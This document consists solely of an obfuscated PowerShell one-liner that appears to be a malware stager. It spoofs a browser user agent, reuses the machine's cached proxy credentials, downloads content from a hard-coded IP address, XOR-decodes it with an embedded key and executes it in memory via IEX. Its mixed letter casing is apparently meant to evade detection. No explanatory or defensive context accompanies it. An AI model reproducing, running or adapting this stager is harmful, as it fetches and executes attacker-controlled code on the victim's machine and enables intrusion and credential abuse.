
$WysTEm.Net.SeRviCEPOIntMaNAGer]::EXPECT100ContinUe = 0;$wc=New-ObjeCT SysTem.Net.WebCliENt;$u='Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko';$wc.HEAdErs.ADD('User-Agent',$u);$WC.PrOXy = [SYStem.NeT.WeBREQUeSt]::DefaultWebPROxy;$wc.PROxy.CrEDenTiALs = [SySTem.Net.CrEdENTIAlCAcHe]::DefAuLtNEtwOrKCRedenTiaLS;$K='cc03e747a6afbbcbf8be7668acfebee5';$I=0;[CHar[]]$B=([chaR[]]($wC.DOwnLoaDSTriNg("http://103.238.227.201:7788/index.asp")))|%{$_-BXoR$K[$I++%$k.LeNgTH]};IEX ($b-JoIN'')

